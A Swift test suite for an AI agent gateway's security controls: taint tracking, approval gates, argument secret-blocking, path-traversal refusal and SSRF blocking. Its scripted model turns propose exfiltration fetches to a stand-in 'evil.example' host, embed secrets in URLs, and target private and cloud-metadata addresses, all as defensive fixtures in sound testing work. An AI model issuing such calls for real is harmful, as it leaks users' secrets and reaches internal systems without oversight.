import ClawAgent
import ClawCore
import ClawData
import ClawTools
import Foundation
import GRDB
import Testing

@testable import ClawGateway

@Suite(.serialized) struct SC3AcceptanceTests {
  // Clause 1 — no-tap URL fetch + summarize; audit row; PERSISTED taint (reopen the DB).
  @Test func clauseOneNoTapFetchSummarizeTaints() async throws {
    let harness = try makeSC3Harness(
      scripts: [
        [
          toolCallResponse([fetchProposal(url: "https://example.com/a")]),
          okResponse(content: "Summary: the page greets the world."),
        ]
      ],
      httpResponses: [
        "https://example.com/a": HTTPResult(
          statusCode: 200,
          headers: ["Content-Type": "text/html"],
          body: Data("<html><body>Hello world page</body></html>".utf8)
        )
      ]
    )
    _ = await harness.router.handle(
      rawUpdate: textUpdate(id: 1, from: 7, text: "read https://example.com/a and summarize")
    )
    let payloads = try await harness.waitForOutbox(atLeast: 1)

    #expect(
      payloads.contains { payload in payload.contains("Summary: the page greets the world.") }
    )
    #expect(payloads.allSatisfy { payload in payload.contains("Reply yes") == false })  // NO tap

    // audit has the tool_call row for the fetch (action tool_call / tool web_fetch / decision ok)
    let audit = try harness.auditRows()
    #expect(
      audit.contains { row in
        row.action == "tool_call" && row.tool == "web_fetch" && row.decision == "ok"
      }
    )

    // taint persisted: REOPEN the same DB file and assert
    let reopened = try ClawDatabase.openStores(path: harness.databasePath)
    let sessionId = try reopened.sessionMessages.findSession(sessionKey: harness.sessionKey) ?? 0
    let snapshot = try reopened.sessionMessages.loadContextSnapshot(
      sessionId: sessionId,
      throughMessageId: Int64.max,
      limit: 50
    )
    #expect(snapshot.isTainted)
  }

  // Clause 2 — no-tap in-tree workspace read; `../` traversal and an out-of-tree symlink refused,
  // and the outside content never leaks into any reply (§17-2).
  @Test func clauseTwoWorkspaceReadRefusesEscapes() async throws {
    let harness = try makeSC3Harness(
      scripts: [
        [
          toolCallResponse([
            ToolCall(id: "c1", name: "file_read", argumentsJSON: #"{"path":"notes/project.md"}"#)
          ]),
          okResponse(content: "Summary: the notes cover the roadmap."),
        ],
        [
          toolCallResponse([
            ToolCall(id: "c2", name: "file_read", argumentsJSON: #"{"path":"../outside.md"}"#)
          ]),
          okResponse(content: "I couldn't read that path."),
        ],
        [
          toolCallResponse([
            ToolCall(id: "c3", name: "file_read", argumentsJSON: #"{"path":"link-out.md"}"#)
          ]),
          okResponse(content: "I couldn't follow that link."),
        ],
      ],
      httpResponses: [:],
      workspaceFiles: ["notes/project.md": "the roadmap and the delivery plan"]
    )
    // A secret file OUTSIDE the workspace, and an in-tree symlink escaping to it.
    let outside = harness.workspaceRoot.deletingLastPathComponent()
      .appendingPathComponent("outside-\(UUID().uuidString).md")
    try "TOP SECRET OUTSIDE CONTENT".write(to: outside, atomically: true, encoding: .utf8)
    try FileManager.default.createSymbolicLink(
      at: harness.workspaceRoot.appendingPathComponent("link-out.md"),
      withDestinationURL: outside
    )

    _ = await harness.router.handle(
      rawUpdate: textUpdate(id: 1, from: 7, text: "read notes/project.md")
    )
    _ = try await harness.waitForOutbox(atLeast: 1)
    _ = await harness.router.handle(
      rawUpdate: textUpdate(id: 2, from: 7, text: "read ../outside.md")
    )
    _ = try await harness.waitForOutbox(atLeast: 2)
    _ = await harness.router.handle(rawUpdate: textUpdate(id: 3, from: 7, text: "read link-out.md"))
    let payloads = try await harness.waitForOutbox(atLeast: 3)

    #expect(
      payloads.contains { payload in payload.contains("Summary: the notes cover the roadmap.") }
    )
    #expect(
      payloads.allSatisfy { payload in payload.contains("TOP SECRET OUTSIDE CONTENT") == false }
    )
  }

  // Clause 3 — the full approval lifecycle (see SC3Clause3AndRegressionTests).

  // Clause 4 — blocked args: the exact loaded secret, an `sk-`-shaped token, and a ≥16-grapheme
  // MEMORY.md substring under the trifecta are all refused BEFORE any egress (§17-4).
  // swiftlint:disable:next function_body_length
  @Test func clauseFourBlockedArgsNeverEgress() async throws {
    let secret = "s3cret-bot-token-value"
    let memory = "REMEMBER: the phrase vault-code-8842-alpha-zulu unlocks the safe"
    let harness = try makeSC3Harness(
      scripts: [
        // turn 1 taints the session and puts MEMORY.md on disk, arming the trifecta for case (c).
        [
          toolCallResponse([fetchProposal(url: "https://example.com/a")]),
          okResponse(content: "read the page"),
        ],
        // (a) the exact loaded secret value inside a fetch URL.
        [
          toolCallResponse([
            ToolCall(
              id: "a1",
              name: "web_fetch",
              argumentsJSON: #"{"url":"https://example.com/leak-\#(secret)"}"#
            )
          ]),
          okResponse(content: "I can't include that value."),
        ],
        // (b) an sk- shaped token in a web_search query.
        [
          toolCallResponse([
            ToolCall(
              id: "b1",
              name: "web_search",
              argumentsJSON: #"{"query":"look up sk-ABCDEFGHIJKLMNOP1234"}"#
            )
          ]),
          okResponse(content: "I can't search for that."),
        ],
        // (c) a ≥16-grapheme substring of the on-disk MEMORY.md in a fetch URL.
        [
          toolCallResponse([
            ToolCall(
              id: "c1",
              name: "web_fetch",
              argumentsJSON: #"{"url":"https://example.com/?q=vault-code-8842-alpha-zulu"}"#
            )
          ]),
          okResponse(content: "I can't include that value."),
        ],
      ],
      httpResponses: [
        "https://example.com/a": HTTPResult(
          statusCode: 200,
          headers: ["Content-Type": "text/html"],
          body: Data("<html><body>hello</body></html>".utf8)
        )
      ],
      secretValues: [secret],
      workspaceFiles: ["MEMORY.md": memory]
    )

    for turnId in Int64(1)...4 {
      _ = await harness.router.handle(
        rawUpdate: textUpdate(id: turnId, from: 7, text: "turn \(turnId)")
      )
      _ = try await harness.waitForOutbox(atLeast: Int(turnId))
    }

    // Only turn 1's fetch ever egressed; the three blocked-arg proposals never touched the network.
    #expect(await harness.http.requestedURLs == ["https://example.com/a"])
    let payloads = try await harness.waitForOutbox(atLeast: 4)
    #expect(payloads.allSatisfy { payload in payload.contains(secret) == false })

    // Audit carries three blocked_args rows (decision blocked_args) with redacted args.
    let audit = try harness.auditRows()
    let blockedArgsRows = audit.filter { row in
      row.action == "tool_call" && row.decision == "blocked_args"
    }
    #expect(blockedArgsRows.count == 3)
  }

  // Clause 5 — SSRF: loopback/private/link-local literals and a public→private redirect are all
  // refused; only the public first hop of the redirect case ever egressed (§17-5).
  @Test func clauseFiveSSRFTableRefused() async throws {
    let blockedTargets = [
      "http://127.0.0.1/", "http://10.0.0.8/", "http://192.168.1.1/",
      "http://169.254.169.254/latest/meta-data/", "http://[::1]/", "http://[fe80::1]/",
    ]
    var scripts: [[ChatResponse]] = blockedTargets.enumerated().map { index, url in
      [
        toolCallResponse([
          ToolCall(id: "s\(index)", name: "web_fetch", argumentsJSON: #"{"url":"\#(url)"}"#)
        ]),
        okResponse(content: "That address is not reachable."),
      ]
    }
    // The redirect case: a public host 302s to a private one.
    scripts.append([
      toolCallResponse([
        ToolCall(
          id: "redir",
          name: "web_fetch",
          argumentsJSON: #"{"url":"http://public.example/go"}"#
        )
      ]),
      okResponse(content: "That redirect target is not reachable."),
    ])

    let harness = try makeSC3Harness(
      scripts: scripts,
      httpResponses: [
        "http://public.example/go": HTTPResult(
          statusCode: 302,
          headers: ["Location": "http://10.0.0.9/secret"],
          body: Data()
        )
      ],
      resolverTable: ["public.example": [resolvedAddress("93.184.216.34")]]
    )

    for turnId in Int64(1)...Int64(scripts.count) {
      _ = await harness.router.handle(
        rawUpdate: textUpdate(id: turnId, from: 7, text: "fetch \(turnId)")
      )
      _ = try await harness.waitForOutbox(atLeast: Int(turnId))
    }

    // Every literal was refused before a network call; only the redirect's public first hop egressed.
    #expect(await harness.http.requestedURLs == ["http://public.example/go"])
  }
}

// MARK: - Clause 3 lifecycle + rev.1 regressions

/// Deterministic two-phase gate: the dispatch signals it has ENTERED, then blocks until RELEASED.
actor ReleaseGate {
  private var entered = false
  private var released = false
  private var enterWaiters: [CheckedContinuation<Void, Never>] = []
  private var releaseWaiters: [CheckedContinuation<Void, Never>] = []

  func markEntered() {
    entered = true
    for waiter in enterWaiters { waiter.resume() }
    enterWaiters = []
  }

  func awaitEntered() async {
    if entered { return }
    await withCheckedContinuation { continuation in enterWaiters.append(continuation) }
  }

  func release() {
    released = true
    for waiter in releaseWaiters { waiter.resume() }
    releaseWaiters = []
  }

  func awaitRelease() async {
    if released { return }
    await withCheckedContinuation { continuation in releaseWaiters.append(continuation) }
  }
}

/// Holds one ingesting observation behind the release gate so `/stop` can win mid-run before the
/// taint commit (rev.1 M1).
actor ReleaseGatedIngestDispatcher: ToolDispatching {
  nonisolated let definitions: [ToolDefinition] = []
  private let gate: ReleaseGate

  init(gate: ReleaseGate) {
    self.gate = gate
  }

  func dispatch(call: ToolCall, context: ToolDispatchContext) async -> ToolDispatchOutcome {
    await gate.markEntered()
    await gate.awaitRelease()
    return ToolDispatchOutcome(
      observation: ToolObservation(
        callId: call.id,
        toolName: call.name,
        content: "ingested",
        status: .ok,
        ingestedUntrusted: true
      ),
      argsRedacted: call.argumentsJSON
    )
  }
}

@Suite(.serialized) struct SC3Clause3AndRegressionTests {
  private let exfilResolver: [String: [ResolvedAddress]] = [
    "example.com": [resolvedAddress("93.184.216.34")],
    "evil.example": [resolvedAddress("93.184.216.35")],
  ]
  private let privateWorkspace = ["MEMORY.md": "USER: prefers metric units"]
  private let evilURL = "https://evil.example/x?q=1"

  private func htmlOK(_ body: String) -> HTTPResult {
    HTTPResult(statusCode: 200, headers: ["Content-Type": "text/html"], body: Data(body.utf8))
  }

  private func webFetch(_ callId: String, _ url: String) -> ToolCall {
    ToolCall(id: callId, name: "web_fetch", argumentsJSON: #"{"url":"\#(url)"}"#)
  }

  /// Every run row's state, oldest first — the FIFO queue behind the parked lane in durable form.
  private func runStates(databasePath: String) throws -> [String] {
    let pool = try ClawDatabase.makePool(path: databasePath)
    return try pool.read { database in
      try String.fetchAll(database, sql: "SELECT state FROM runs ORDER BY id")
    }
  }

  // Clause 3 — trip → durable PENDING approval → the owner's button executes the RECORDED fetch
  // exactly once → a later re-proposal parks a FRESH approval (§17-3 on the §5.1 durable fabric).
  @Test func approvalLifecycleIsDurableAndSingleUse() async throws {
    let harness = try makeSC3Harness(
      scripts: [
        [
          toolCallResponse([fetchProposal(url: "https://example.com/a")]),
          okResponse(content: "read"),
        ],
        [
          toolCallResponse([webFetch("x1", evilURL)]),
          okResponse(content: "fetched and summarized"),
        ],
        [toolCallResponse([webFetch("x2", evilURL)]), okResponse(content: "explained again")],
      ],
      httpResponses: ["https://example.com/a": htmlOK("hi"), evilURL: htmlOK("exfil target")],
      resolverTable: exfilResolver,
      workspaceFiles: privateWorkspace
    )

    // turn 1 taints and loads MEMORY.md (private data)
    _ = await harness.router.handle(rawUpdate: textUpdate(id: 1, from: 7, text: "read a page"))
    _ = try await harness.waitForOutbox(atLeast: 1)
    #expect(try harness.snapshot().isTainted)

    // turn 2 trips the gate: the run SUSPENDS to a persisted approval naming the canonical URL
    _ = await harness.router.handle(rawUpdate: textUpdate(id: 2, from: 7, text: "and fetch evil"))
    let approval = try #require(
      await pollUntil(timeout: .seconds(10)) {
        try fetchApprovals(databasePath: harness.databasePath).first
      }
    )
    #expect(approval.state == ApprovalState.pending.rawValue)
    #expect(approval.tool == "web_fetch")
    #expect(approval.reason == ApprovalReason.exfilTrifecta.rawValue)
    #expect(approval.canonicalTarget == evilURL)
    #expect(
      try runState(databasePath: harness.databasePath, runId: approval.runId)
        == RunState.awaitingApproval.rawValue
    )
    #expect(await harness.http.requestedURLs.contains(evilURL) == false)
    let prompts = try await harness.waitForOutbox(atLeast: 2)
    #expect(prompts.contains { payload in payload.contains("evil.example/x?q=1") })

    // the owner taps Approve — the RECORDED fetch executes exactly once and the run resumes
    _ = await harness.router.handle(
      rawUpdate: callbackUpdate(
        id: 3,
        from: 7,
        data: ApprovalKeyboard.callbackData(
          nonce: approval.nonce,
          verdict: ApprovalKeyboard.approveVerdict
        )
      )
    )
    _ = try await pollUntil(timeout: .seconds(10)) {
      try runState(databasePath: harness.databasePath, runId: approval.runId)
        == RunState.done.rawValue ? true : nil
    }
    #expect(await harness.http.requestedURLs.filter { url in url == evilURL } == [evilURL])
    #expect(
      try fetchApprovals(databasePath: harness.databasePath).map(\.state)
        == [ApprovalState.approved.rawValue]
    )

    // single-use: a later proposal of the same URL parks a FRESH approval, never re-executes
    _ = await harness.router.handle(rawUpdate: textUpdate(id: 4, from: 7, text: "fetch it again"))
    _ = try await pollUntil(timeout: .seconds(10)) {
      try fetchApprovals(databasePath: harness.databasePath).count == 2 ? true : nil
    }
    let reTripped = try #require(try fetchApprovals(databasePath: harness.databasePath).last)
    #expect(reTripped.state == ApprovalState.pending.rawValue)
    #expect(await harness.http.requestedURLs.filter { url in url == evilURL } == [evilURL])
  }

  // Clause 3 variant — a plain "yes" is just text (§8.3): it neither resolves nor executes the
  // durable approval; only the owner's button callback can.
  @Test func plainYesDoesNotResolveTheDurableApproval() async throws {
    let harness = try makeSC3Harness(
      scripts: [
        [
          toolCallResponse([fetchProposal(url: "https://example.com/a")]),
          okResponse(content: "read"),
        ],
        [toolCallResponse([webFetch("x1", evilURL)]), okResponse(content: "explained")],
      ],
      httpResponses: ["https://example.com/a": htmlOK("hi")],
      resolverTable: exfilResolver,
      workspaceFiles: privateWorkspace
    )
    _ = await harness.router.handle(rawUpdate: textUpdate(id: 1, from: 7, text: "read a page"))
    _ = try await harness.waitForOutbox(atLeast: 1)
    _ = await harness.router.handle(rawUpdate: textUpdate(id: 2, from: 7, text: "fetch evil"))
    let approval = try #require(
      await pollUntil(timeout: .seconds(10)) {
        try fetchApprovals(databasePath: harness.databasePath).first
      }
    )
    let egressBefore = await harness.http.requestedURLs

    // when — the owner types "yes" instead of tapping the button
    _ = await harness.router.handle(rawUpdate: textUpdate(id: 3, from: 7, text: "yes"))

    // then — positive proof the "yes" was processed: it persisted as an ordinary THIRD run that
    // queues FIFO behind the held lane (PlainReplyDoesNotApproveTests pins the same idiom)
    let states = try #require(
      await pollUntil(timeout: .seconds(10)) {
        let observed = try runStates(databasePath: harness.databasePath)
        return observed.count == 3 ? observed : nil
      }
    )
    #expect(
      states == [
        RunState.done.rawValue,
        RunState.awaitingApproval.rawValue,
        RunState.pending.rawValue,
      ]
    )

    // and — nothing executed; the approval stays PENDING and the run stays parked
    #expect(await harness.http.requestedURLs == egressBefore)
    #expect(
      try fetchApprovals(databasePath: harness.databasePath).map(\.state)
        == [ApprovalState.pending.rawValue]
    )
    #expect(
      try runState(databasePath: harness.databasePath, runId: approval.runId)
        == RunState.awaitingApproval.rawValue
    )
  }

  // Restart re-parks a live approval (spec §6.5 / Task 19): the durable `approvals` row survives the
  // process boundary, boot reconciliation re-parks the lane, and the owner's button still resolves.
  @Test func restartReParksTheApproval() async throws {
    let sharedDB = FileManager.default.temporaryDirectory
      .appendingPathComponent("claw-sc3-\(UUID().uuidString).sqlite").path
    let first = try makeSC3Harness(
      scripts: [
        [
          toolCallResponse([
            ToolCall(
              id: "w1",
              name: "file_write",
              argumentsJSON: #"{"path":"notes/plan.md","content":"hello","overwrite":false}"#
            )
          ]),
          okResponse(content: "saved"),
        ]
      ],
      httpResponses: [:],
      databasePath: sharedDB
    )
    _ = await first.router.handle(rawUpdate: textUpdate(id: 1, from: 7, text: "write the plan"))
    let parked = try #require(
      await pollUntil(timeout: .seconds(10)) {
        try fetchApprovals(databasePath: sharedDB).first
      }
    )
    #expect(parked.state == ApprovalState.pending.rawValue)

    // restart: same DB and workspace, fresh coordinator/registry — boot reconciliation re-parks
    // the lane
    let second = try makeSC3Harness(
      scripts: [[okResponse(content: "saved")]],
      httpResponses: [:],
      databasePath: sharedDB,
      workspaceRoot: first.workspaceRoot
    )
    await second.runBootReconciliation()

    // the row still PENDING after the restart — nothing denied it
    #expect(
      try fetchApprovals(databasePath: sharedDB).map(\.state) == [ApprovalState.pending.rawValue]
    )

    // and the owner's button resolves it against the re-parked lane
    _ = await second.router.handle(
      rawUpdate: callbackUpdate(
        id: 2,
        from: 7,
        data: ApprovalKeyboard.callbackData(
          nonce: parked.nonce,
          verdict: ApprovalKeyboard.approveVerdict
        )
      )
    )
    _ = try await pollUntil(timeout: .seconds(10)) {
      FileManager.default.fileExists(atPath: parked.canonicalTarget) ? true : nil
    }
    #expect(
      try fetchApprovals(databasePath: sharedDB).map(\.state) == [ApprovalState.approved.rawValue]
    )
    #expect(
      try String(contentsOfFile: parked.canonicalTarget, encoding: .utf8) == "hello"
    )
  }

  // Regression H1 — in-run private data (a disk read the assembly omitted) gates the fetch, and a
  // ≥16-grapheme on-disk-MEMORY substring is refused before egress (tier-3 reads disk, rev.1 H1).
  @Test func inRunPrivateDataGatesFetchAndBlocksArgs() async throws {
    let secretPhrase = "vault-code-8842-alpha-zulu-omega"
    let bigMemory =
      "SECRET \(secretPhrase)\n"
      + String(repeating: "padding line\n", count: ContextBudget.default.memoryFileCap)
    let stealURL = "https://evil.example/steal"
    let harness = try makeSC3Harness(
      scripts: [
        [
          toolCallResponse([fetchProposal(url: "https://example.com/a")]),
          okResponse(content: "read"),
        ],
        // The suspending turn's script holds ONLY the proposal: the run parks on it, and the
        // deny path never resumes the model, so a continuation reply here would leak into the
        // NEXT turn's script slot and desync the provider.
        [
          toolCallResponse([
            ToolCall(id: "r1", name: "file_read", argumentsJSON: #"{"path":"MEMORY.md"}"#),
            webFetch("f1", stealURL),
          ])
        ],
        [
          // The tier-3 substring rule runs only under the trifecta. The over-cap MEMORY.md is
          // still omitted from assembly, so this run re-arms private data via a disk read (and,
          // post-§4.5, via the persisted session flag), then proposes the exfil fetch — the H1
          // shape.
          toolCallResponse([
            ToolCall(id: "r2", name: "file_read", argumentsJSON: #"{"path":"MEMORY.md"}"#),
            webFetch("f2", "https://example.com/?q=\(secretPhrase)"),
          ]),
          okResponse(content: "can't include that"),
        ],
      ],
      httpResponses: ["https://example.com/a": htmlOK("hi")],
      resolverTable: exfilResolver,
      workspaceFiles: ["MEMORY.md": bigMemory]
    )
    _ = await harness.router.handle(rawUpdate: textUpdate(id: 1, from: 7, text: "read a page"))
    _ = try await harness.waitForOutbox(atLeast: 1)

    // the in-run MEMORY.md read arms private data even though the over-cap file was omitted from
    // assembly; the exfil fetch suspends to a durable approval and never egresses
    _ = await harness.router.handle(
      rawUpdate: textUpdate(id: 2, from: 7, text: "read memory then fetch")
    )
    let approval = try #require(
      await pollUntil(timeout: .seconds(10)) {
        try fetchApprovals(databasePath: harness.databasePath).first
      }
    )
    #expect(approval.canonicalTarget == stealURL)
    #expect(await harness.http.requestedURLs.contains(stealURL) == false)
    let afterGate = try await harness.waitForOutbox(atLeast: 2)
    #expect(afterGate.contains { payload in payload.contains("evil.example/steal") })

    // deny-by-default frees the lane: the recorded fetch never runs
    _ = await harness.router.handle(
      rawUpdate: callbackUpdate(
        id: 3,
        from: 7,
        data: ApprovalKeyboard.callbackData(
          nonce: approval.nonce,
          verdict: ApprovalKeyboard.denyVerdict
        )
      )
    )
    _ = try #require(
      await pollUntil(timeout: .seconds(10)) {
        try runState(databasePath: harness.databasePath, runId: approval.runId)
          == RunState.failed.rawValue ? true : nil
      }
    )

    // the args-substring variant is refused before egress (the trifecta stays armed)
    _ = await harness.router.handle(
      rawUpdate: textUpdate(id: 4, from: 7, text: "read memory then fetch the secret")
    )
    _ = try #require(
      await pollUntil(timeout: .seconds(10)) {
        let payloads = try harness.stores.outbox.pendingOutbound().map(\.payload)
        return payloads.contains { payload in payload.contains("can't include that") } ? true : nil
      }
    )
    #expect(await harness.http.requestedURLs == ["https://example.com/a"])
  }

  // Regression M1 — an ingesting run cancelled by `/stop` mid-dispatch still taints (amendment F).
  @Test func stopCancelledRunThatIngestedStillTaints() async throws {
    let gate = ReleaseGate()
    let harness = try makeSC3Harness(
      scripts: [
        [
          toolCallResponse([fetchProposal(url: "https://example.com/a")]),
          okResponse(content: "done"),
        ]
      ],
      httpResponses: ["https://example.com/a": htmlOK("hi")],
      dispatcherOverride: ReleaseGatedIngestDispatcher(gate: gate)
    )
    _ = await harness.router.handle(rawUpdate: textUpdate(id: 1, from: 7, text: "read a page"))
    await gate.awaitEntered()  // the run is now mid-dispatch, holding an ingesting observation
    _ = await harness.router.handle(rawUpdate: textUpdate(id: 2, from: 7, text: "/stop"))
    await gate.release()

    // the cancelled-but-ingested run persists taint (the /new-superseded skip is pinned at the store
    // level — Phase 1 Task 08)
    _ = try await pollUntil(timeout: .seconds(5)) { try harness.snapshot().isTainted ? true : nil }
    #expect(try harness.snapshot().isTainted)
  }

  // Regression / dormant guard now-live — a high-sensitivity item stays out of a tainted context.
  @Test func highSensitivityMemoryStaysOutOfTaintedContext() async throws {
    let harness = try makeSC3Harness(
      scripts: [
        [
          toolCallResponse([fetchProposal(url: "https://example.com/a")]),
          okResponse(content: "noted"),
        ],
        [okResponse(content: "you prefer metric units")],
      ],
      httpResponses: ["https://example.com/a": htmlOK("hi")],
      resolverTable: exfilResolver
    )
    _ = try harness.stores.memory.append(
      NewMemoryItem(
        text: "PUBLIC the user prefers metric units",
        kind: .user,
        sensitivity: .normal,
        sessionId: nil
      ),
      now: Date()
    )
    _ = try harness.stores.memory.append(
      NewMemoryItem(
        text: "SECRET the vault code is 8842-alpha",
        kind: .user,
        sensitivity: .high,
        sessionId: nil
      ),
      now: Date()
    )

    // turn 1 taints the session
    _ = await harness.router.handle(rawUpdate: textUpdate(id: 1, from: 7, text: "read a page"))
    _ = try await harness.waitForOutbox(atLeast: 1)
    #expect(try harness.snapshot().isTainted)

    // turn 2's assembled request must carry the normal item and exclude the high one
    _ = await harness.router.handle(
      rawUpdate: textUpdate(id: 2, from: 7, text: "what units do I prefer?")
    )
    _ = try await harness.waitForOutbox(atLeast: 2)
    let lastRequest = try #require(await harness.provider.requests.last)
    let assembled = lastRequest.messages.map(\.content).joined(separator: "\n")
    #expect(assembled.contains("the user prefers metric units"))
    #expect(assembled.contains("the vault code is 8842-alpha") == false)
  }
}
